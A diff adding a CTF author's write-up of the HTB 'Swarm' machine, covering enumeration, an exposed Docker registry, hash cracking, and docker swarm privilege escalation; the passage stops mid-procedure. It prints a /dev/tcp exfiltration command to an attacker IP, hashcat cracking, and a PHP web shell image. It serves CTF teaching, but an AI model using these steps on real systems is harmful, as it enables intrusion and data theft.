@@ -2,12 +2,12 @@
 <html lang="en" data-bs-theme="dark">
   <head>
   
-  <title>Enigmelo Blog  | Posts </title>
+  <title>Enigmelo Blog  | HTB Business CTF - Swarm Writeup </title>
 
   
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no" />
-  <meta name="description" content="Powerful, extensible, and feature-packed frontend toolkit. Build and customize with Sass, utilize prebuilt grid system and components, and bring projects to life with powerful JavaScript plugins." />
+  <meta name="description" content="Writeup for my 2024 HTB Business CTF FullPwn Box Swarm." />
 
   
   <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
@@ -21,13 +21,16 @@
 
 
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Posts">
-  <meta name="twitter:description" content="Powerful, extensible, and feature-packed frontend toolkit. Build and customize with Sass, utilize prebuilt grid system and components, and bring projects to life with powerful JavaScript plugins.">
+  <meta name="twitter:title" content="HTB Business CTF - Swarm Writeup">
+  <meta name="twitter:description" content="Writeup for my 2024 HTB Business CTF FullPwn Box Swarm.">
 
 
-  <meta itemprop="name" content="Posts">
-  <meta itemprop="description" content="Powerful, extensible, and feature-packed frontend toolkit. Build and customize with Sass, utilize prebuilt grid system and components, and bring projects to life with powerful JavaScript plugins.">
+  <meta itemprop="name" content="HTB Business CTF - Swarm Writeup">
+  <meta itemprop="description" content="Writeup for my 2024 HTB Business CTF FullPwn Box Swarm.">
+  <meta itemprop="datePublished" content="2024-05-21T18:18:49+00:00">
   <meta itemprop="dateModified" content="2024-05-21T18:18:49+00:00">
+  <meta itemprop="wordCount" content="3173">
+  <meta itemprop="keywords" content="HTB,Writeup,Swarm,Business CTF">
 
 
 
@@ -83,7 +86,6 @@
 
 
   
-  <link rel="alternate" type="application/rss+xml" href="https://crzphil.github.io/posts/index.xml" title="Enigmelo Blog" />
   </head>
 
   <body class="d-flex flex-column min-vh-100"><nav class="navbar navbar-expand-lg py-3">
@@ -110,17 +112,13 @@
 
 <main class="container py-5 flex-grow-1">
   <div class="row justify-content-center">
-    <div class="col-12 mh-100">
-      
-      
-        <article class="py-4">
-  <div class="py-2">
-    <h1 class="display-1 text-center text-uppercase fw-bold text-primary">
-      <a class="text-decoration-none" href="https://crzphil.github.io/posts/swarm/">
-        HTB Business CTF - Swarm Writeup
-      </a>
-    </h1>
-    <div class="text-center text-muted mb-1">
+    <div class="col-12 mw-md mh-100">
+      <div class="py-4">
+        <div class="py-2">
+          <h1 class="display-1 text-center text-uppercase fw-bold text-primary">
+            HTB Business CTF - Swarm Writeup
+          </h1>
+          <div class="text-center text-muted mb-1">
   
   
     <span class="d-inline-flex align-items-center small mx-2">
@@ -148,7 +146,7 @@
   
 </div>
 
-    <div class="text-center">
+          <div class="text-center">
   
     <span class="mx-2"> 
       
@@ -180,17 +178,446 @@
   
 </div>
 
-  </div>
-  <div class="lead text-center py-2">
-    <p>This is a writeup for my 2024 Hack The Box Business CTF FullPwn Machine, Swarm. While I was not initially planning on creating a dedicated writeup for the machine, it was brought to my attention that many players regarded the privilege escalation as ungodly. As such, I felt a responsibility to provide the traumatised players with a thorough explanation for my creation.</p>
-  </div>
-</article>
-
-      
+        </div>
+        <div class="text-center py-2">
+          Writeup for my 2024 HTB Business CTF FullPwn Box Swarm.
+        </div>
+        <div class="markdown-content py-2">
+          <p>This is a writeup for my 2024 Hack The Box Business CTF FullPwn Machine, Swarm. While I was not initially planning on creating a dedicated writeup for the machine, it was brought to my attention that many players regarded the privilege escalation as ungodly. As such, I felt a responsibility to provide the traumatised players with a thorough explanation for my creation.</p>
+<p><img src="/posts/confession.png" alt="confession"></p>
+<h1 id="enumeration">Enumeration</h1>
+<p>As always, we start off with an <code>nmap</code> scan to test the waters.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ports<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>nmap -p- --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span> -T4 10.129.230.94 | grep <span style="color:#e6db74">&#39;^[0-9]&#39;</span> | cut -d <span style="color:#e6db74">&#39;/&#39;</span> -f <span style="color:#ae81ff">1</span> | tr <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#e6db74">&#39;,&#39;</span> | sed s/,$//<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>nmap -p$ports -sC -sV 10.129.230.94
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-25 17:21 BST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> swarm.htb <span style="color:#f92672">(</span>10.129.230.94<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.016s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE    VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http       nginx 1.25.5
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.25.5
+</span></span><span style="display:flex;"><span>|_http-title: Home - Simple News Portal
+</span></span><span style="display:flex;"><span>5000/tcp open  http       Docker Registry <span style="color:#f92672">(</span>API: 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title.
+</span></span><span style="display:flex;"><span>7946/tcp open  unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 92.82 seconds
+</span></span></code></pre></div><p>We see that <code>SSH</code> is at our disposal, as well as an <code>NGINX</code> web server and a Docker registry on port <code>5000</code>.</p>
+<h2 id="port-80">Port 80</h2>
+<p>Browsing to the website on port 80, we get redirected to <code>swarm.htb</code>, which we add to our <code>hosts</code> file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo 10.129.230.94	swarm.htb | sudo tee -a /etc/hosts
+</span></span></code></pre></div><p>We land on a news page hosting several articles related to events from the CTF lore. The site has a Login mechanism but no means to register an account.</p>
+<p><img src="/posts/web.png" alt="web application"></p>
+<p>We run a directory scan to look for potentially interesting endpoints.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://swarm.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">100</span> -q
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/login                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 5673<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/profile              <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; /login?next<span style="color:#f92672">=</span>/profile<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/admin                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; /admin/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/posts                <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; /login?next<span style="color:#f92672">=</span>/posts<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/logout               <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; /<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Browsing to <code>/admin</code> reveals that we are dealing with a Django backend.</p>
+<p><img src="/posts/django.png" alt="Django admin"></p>
+<p>At this point, we have hit a wall, as there&rsquo;s no more functionality to investigate on the web application, and we lack any credentials for the admin panel. We therefore move on to the exposed Docker registry.</p>
+<h1 id="foothold">Foothold</h1>
+<p>We can use the registry API to query for images hosted on the service, as long as it is not password-protected.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://swarm.htb:5000/v2/_catalog
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;repositories&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;newsbox-web&#34;</span><span style="color:#f92672">]}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>curl http://swarm.htb:5000/v2/newsbox-web/tags/list
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;newsbox-web&#34;</span>,<span style="color:#e6db74">&#34;tags&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;latest&#34;</span><span style="color:#f92672">]}</span>
+</span></span></code></pre></div><p>We see an image (repository) named <code>newsbox-web:latest</code>, which matches the name of the web application we checked out earlier. We proceed to pull the image to create a container locally, so that we can take a look at the backend.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker pull 10.129.230.94:5000/newsbox-web:latest    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Error response from daemon: Get <span style="color:#e6db74">&#34;https://10.129.230.94:5000/v2/&#34;</span>: http: server gave HTTP response to HTTPS client
+</span></span></code></pre></div><p>We get an error, as the Docker client defaults to using HTTPS for registry communication, which fails here as the registry is not set up for HTTPS. To fix this, we need to add the server to our insecure-registries, allowing Docker to “trust” it without validating it via SSL.</p>
+<blockquote>
+<p>Note: An alternative approach that might be preferable for some players could be to use a tool such as <a href="https://github.com/Syzik/DockerRegistryGrabber">DockerRegistryGrabber</a>, which can pull images and re-create the filesystems locally, without creating a Docker container. This is particularly useful for users on different architectures to the target machine, which would otherwise struggle to create a local container using the image.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;{ &#34;insecure-registries&#34;:[&#34;10.129.230.94:5000&#34;] }&#39;</span> | sudo tee -a /etc/docker/daemon.json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span> <span style="color:#e6db74">&#34;insecure-registries&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;10.129.230.94:5000&#34;</span><span style="color:#f92672">]</span> <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>We then have to restart the docker service for our changes to take effect, after which we retry pulling the image.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo systemctl restart docker
+</span></span><span style="display:flex;"><span>docker pull 10.129.230.94:5000/newsbox-web:latest    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>latest: Pulling from newsbox-web
+</span></span><span style="display:flex;"><span>b0a0cf830b12: Pull complete 
+</span></span><span style="display:flex;"><span>72914424168c: Pull complete 
+</span></span><span style="display:flex;"><span>545ebfaa7506: Pull complete 
+</span></span><span style="display:flex;"><span>80ee918b2084: Pull complete 
+</span></span><span style="display:flex;"><span>d361726ad66f: Pull complete 
+</span></span><span style="display:flex;"><span>4d2c6c1a8e80: Pull complete 
+</span></span><span style="display:flex;"><span>df4459b8a74f: Pull complete 
+</span></span><span style="display:flex;"><span>26484ab3509b: Pull complete 
+</span></span><span style="display:flex;"><span>Digest: sha256:26e727643185bfcf51da5fe8003f76d3b43ee1e51762fb44f0fae1c01679baed
+</span></span><span style="display:flex;"><span>Status: Downloaded newer image <span style="color:#66d9ef">for</span> 10.129.230.94:5000/newsbox-web:latest
+</span></span><span style="display:flex;"><span>10.129.230.94:5000/newsbox-web:latest
+</span></span></code></pre></div><p>Now, we can create a container with the image.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Verify we have the image</span>
+</span></span><span style="display:flex;"><span>docker image ls -a                               
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>REPOSITORY                       TAG       IMAGE ID       CREATED        SIZE
+</span></span><span style="display:flex;"><span>10.129.230.94:5000/newsbox-web   latest    10411032f71d   <span style="color:#ae81ff">25</span> hours ago   198MB
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create the container using the Image ID</span>
+</span></span><span style="display:flex;"><span>docker container create 10411032f71d
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Verify the creation</span>
+</span></span><span style="display:flex;"><span>docker ps  -a
+</span></span><span style="display:flex;"><span>CONTAINER ID   IMAGE          COMMAND       CREATED          STATUS    NAMES
+</span></span><span style="display:flex;"><span>0efa04a66079   10411032f71d   <span style="color:#e6db74">&#34;python...&#34;</span>   <span style="color:#ae81ff">23</span> seconds ago   Created   peaceful_ganguly
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start container using the name</span>
+</span></span><span style="display:flex;"><span>docker start peaceful_ganguly
+</span></span></code></pre></div><p>Finally, we can hop into a shell inside the container.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker exec -it peaceful_ganguly bash
+</span></span></code></pre></div><p>We find ourselves in the <code>/app</code> directory, which matches our expectation of a Django application.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@0efa04a66079:/app# ls -al
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">25</span> 13:09 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">26</span> 15:36 ..
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">180</span> Apr <span style="color:#ae81ff">25</span> 13:08 Dockerfile
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">253952</span> Apr <span style="color:#ae81ff">25</span> 12:59 db.sqlite3
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">25</span> 14:46 django_news
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">689</span> Apr  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2022</span> manage.py
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">4</span> root root   <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">24</span> 16:57 media
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">25</span> 12:05 newsApp
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root     <span style="color:#ae81ff">32</span> Apr <span style="color:#ae81ff">25</span> 13:08 requirements.txt
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">11</span> root root   <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">25</span> 14:49 static
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">1956</span> Apr <span style="color:#ae81ff">25</span> 12:16 wget-log
+</span></span></code></pre></div><p>We see a <code>db.sqlite3</code> file, which we exfiltrate and enumerate for possible password hashes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Locally</span>
+</span></span><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">4444</span> &gt; db.sqlite3   
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># In Docker</span>
+</span></span><span style="display:flex;"><span>root@0efa04a66079:/app# cat &lt; db.sqlite3 &gt; /dev/tcp/10.10.14.40/4444
+</span></span></code></pre></div><p>We get three hashes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlite&gt; <span style="color:#66d9ef">select</span> * from auth_user;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>1|pbkdf2_sha256$60$9jLMaflzyx1C3dAsBqZs8m$1H64ybyNv6NWUIw+TIaYE40VIW9enXe88teW5X+cQEI<span style="color:#f92672">=</span>|2024-04-30 16:32:56.994788|1|admin|Administrator|admin@swarm.htb|1|1|2022-04-06 01:44:10|Melo
+</span></span><span style="display:flex;"><span>2|pbkdf2_sha256$60$HXF8aUc1IWkR9ajH3y8LS8$d7MFlG+lVPC03n31bt4u6OvGs7z1hJpiUYp5eGHoAZM<span style="color:#f92672">=</span>|2022-04-06 08:16:01|0|ChasingDeadlines|Loman|cloman@swarm.htb|0|1|2022-04-06 08:14:40|Chase
+</span></span><span style="display:flex;"><span>3|pbkdf2_sha256$60$6oJcB6Vhj9eECUQS5VgZME$Ha25+TiE5JozOAyUEeN0VTKN27/aNXeWuAp95JXUYFg<span style="color:#f92672">=||</span>0|PenniesForThoughts|Lessing|plessing@swarm.htb|1|1|2024-04-25 12:07:58|Penny
+</span></span></code></pre></div><p>We save the hashes to a file and feed them to <code>hashcat</code>, using mode <code>10000</code> for Django <code>pbkdf2</code>.</p>
+<blockquote>
+<p>Note: The hashes&rsquo; prefix gives away that only 60 iterations were used for the hash, which of course is a non-default setting applied to make the cracking of the hashes less expensive for the sake of exploitation. PBKDF2 is generally quite secure and Django (4.2), by default, uses 600.000 iterations, a number which increases with each release.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">10000</span> hash --wordlist /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;...SNIP....&gt;
+</span></span><span style="display:flex;"><span>pbkdf2_sha256$60$6oJcB6Vhj9eECUQS5VgZME$Ha25+TiE5JozOAyUEeN0VTKN27/aNXeWuAp95JXUYFg<span style="color:#f92672">=</span>:pennypenny99
+</span></span></code></pre></div><p>After about thirty seconds, we obtain the password <code>pennypenny99</code>, for Penny Lessing’s account. We try to <code>SSH</code> into the machine using the credentials, with her email revealing the username to use.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh plessing@swarm.htb
+</span></span></code></pre></div><p>This is where find the <code>user.txt</code> flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>plessing@swarm$ cat user.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTB<span style="color:#f92672">{</span>b3_f1r5t_b3_5m4rt3r_0r_ch34t<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Alas, we reach the apparently traumatising part of the box, which is the privilege escalation, and also the vector that gives the box its name.</p>
+<p>We start by checking the user&rsquo;s <code>sudo</code> permissions.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>plessing@swarm:~$ sudo -l
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> plessing on localhost:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User plessing may run the following commands on localhost:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root : root<span style="color:#f92672">)</span> /usr/bin/docker swarm *
+</span></span></code></pre></div><p>We see that we can run the <code>docker swarm</code> command as <code>root</code>.</p>
+<p><a href="https://docs.docker.com/engine/swarm/">Swarm</a> is a feature that allows the management and creation of a cluster of Docker daemons, distributed across systems. Swarm allows for the deplyoment of Manager and Worker nodes, with the former having the power to control and orchestrate the cluster.</p>
+<p>These clusters work on the basis of so-called services, which are tasks that are executed on the nodes within the swarm. When creating a service, we can specify a container image and the commands that ought to be executed inside the running containers. A service can be replicated and therefore distributed to multiple nodes in the swarm, which is the key to escalating privileges in this scenario.</p>
+<p>The path to exploit this configuration is quite intuitive: we will create a swarm that will contain both the target machine and our attacking machine, and will deploy a malicious container/service that will, by design, be deployed on the target, leading to privilege escalation.</p>
+<h2 id="setting-up-the-swarm">Setting up the Swarm</h2>
+<p>We start by initialising the swarm on the target. Alternatively, we could also start a swarm on our attacking machine and join it from the target.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>plessing@swarm:~$ sudo docker swarm init
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Swarm initialized: current node <span style="color:#f92672">(</span>mt1rdeokdo2ubw7i12758f072<span style="color:#f92672">)</span> is now a manager.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>To add a worker to this swarm, run the following command:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    docker swarm join --token SWMTKN-1-66a7eag29hbj3hyazvw62mqvhydv62t5r6cujjkjzha806f8kw-2ylbobpjug7bbpx7g4hl07aij 10.129.230.94:2377
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>To add a manager to this swarm, run <span style="color:#e6db74">&#39;docker swarm join-token manager&#39;</span> and follow the instructions.
+</span></span></code></pre></div><p>The swarm is initialised, and the target machine automatically joins it as a manager. We also see in the output that we are provided with a command that would allow a node to join the swarm, however, it would be doing so as a worker.</p>
+<p>For our intents and purposes, we need a manager token, which we can generate as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>plessing@swarm:~$ sudo docker swarm join-token manager
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>To add a manager to this swarm, run the following command:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    docker swarm join --token SWMTKN-1-4lgn49qnlg2em8i8kiow50f9x1qt0rh0ru453kbs2xcvv9b9ym-2sa3ni9uj490oioypa72nnyof 10.129.230.94:2377
+</span></span></code></pre></div><p>We can then paste this command on our attacking machine, joining the target&rsquo;s swarm as a manager.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker swarm join --token SWMTKN-1-4lgn49qnlg2em8i8kiow50f9x1qt0rh0ru453kbs2xcvv9b9ym-2sa3ni9uj490oioypa72nnyof 10.129.230.94:2377
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>This node joined a swarm as a manager.
+</span></span></code></pre></div><p>If we run <code>docker info</code>, we can see that the swarm is active and has two nodes; ourselves and the target machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker info
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;...SNIP...&gt;
+</span></span><span style="display:flex;"><span> Swarm: active
+</span></span><span style="display:flex;"><span>  NodeID: arn38feajj60n3ay1zzxmoj11
+</span></span><span style="display:flex;"><span>  Is Manager: true
+</span></span><span style="display:flex;"><span>  ClusterID: r3tj78x77mr29p3cvk7wzdnde
+</span></span><span style="display:flex;"><span>  Managers: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>  Nodes: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>&lt;...SNIP...&gt;
+</span></span></code></pre></div><p>Having self-appointed the manager position, we can now abuse our power and impose services on the unfortunate nodes within our swarm.</p>
+<p>There&rsquo;s different approaches we could take at this stage, such as using a pre-built <code>OpenSSH</code> image, but for the sake of this writeup I will manually create an image hosting a PHP web shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir pwnpod
+</span></span><span style="display:flex;"><span>cd pwnpod
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat &gt; Dockerfile <span style="color:#e6db74">&lt;&lt;EOF
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">FROM php:latest
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">WORKDIR /var/www/html
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">COPY index.php .
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">CMD [&#34;php&#34;, &#34;-S&#34;, &#34;0.0.0.0:1337&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat &gt; index.php <span style="color:#e6db74">&lt;&lt;EOF           
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;?php system(\$_GET[0])?&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>docker image build . -t pwnpod:latest
+</span></span></code></pre></div><p>After building the image, we have to push it to the target&rsquo;s registry:</p>
